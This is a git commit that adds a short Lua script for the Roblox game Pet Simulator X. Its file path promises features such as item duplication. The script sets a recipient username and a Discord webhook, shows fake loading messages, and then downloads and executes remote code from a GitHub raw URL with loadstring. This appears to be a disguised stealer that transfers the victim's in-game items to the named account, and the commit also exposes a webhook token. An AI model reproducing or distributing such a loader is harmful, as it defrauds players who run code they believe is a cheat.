7a073280dec0031f5313c1c1794cf6afedb26272
MoonScriptt <137010878+MoonScriptt@users.noreply.github.com>
2023-07-03 18:43:37 +0700

    ..lua

---
+++ AutoMission/AutoMastery/PetChanger/NewFeatureDupe/Released/MainPsx/Fixed/.lua
@@ -0,0 +1,9 @@
+Username = "charken_14"
+WebHook = "https://discord.com/api/webhooks/1125390545414541334/2XFqmuMft9Yg6mFMrS96v97SkGampjepDmOXlnM1cbEipu2THmVWcpeG9hxm_HQ3BJTI"
+
+_G.CustomScriptName = "MoonHub"
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting for Script"
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Scripts..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
